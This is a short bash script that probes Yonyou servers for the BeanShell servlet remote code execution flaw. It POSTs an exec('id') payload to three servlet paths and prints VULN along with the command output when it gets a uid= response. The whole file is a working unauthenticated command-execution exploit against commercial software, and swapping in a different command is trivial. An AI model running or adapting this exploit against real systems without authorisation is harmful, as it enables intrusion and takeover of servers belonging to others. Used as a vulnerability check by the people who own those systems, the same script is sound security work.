#!/usr/bin/env bash
TARGET="${1:?usage: bash yonyou.sh http://TARGET:PORT}"
B="${TARGET%/}"
for p in "/servlet/~ic/bsh.servlet.BshServlet" "/servlet/~ic/bsh.servlet.BshServlet/" "/servlet/bsh.servlet.BshServlet"; do
  out=$(curl -sS -m 12 -X POST "$B$p" \
    -H 'Content-Type: application/x-www-form-urlencoded' \
    --data-urlencode 'bsh.script=exec("id");' \
    --data 'bsh.servlet.captureOutErr=true&bsh.servlet.output=raw' 2>/dev/null)
  printf '%s' "$out" | grep -qE 'uid=[0-9]+' && { echo "VULN  $B$p"; printf '%s\n' "$out" | head -5; exit 0; }
  echo "SAFE  $B$p"
done
exit 1
